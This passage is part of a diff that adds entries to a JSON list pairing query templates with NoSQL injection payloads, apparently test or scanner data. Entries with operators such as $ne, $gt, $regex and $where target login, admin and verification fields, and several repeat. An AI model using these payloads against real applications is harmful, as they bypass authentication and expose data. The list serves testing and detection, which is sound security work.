+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
     }
 ]
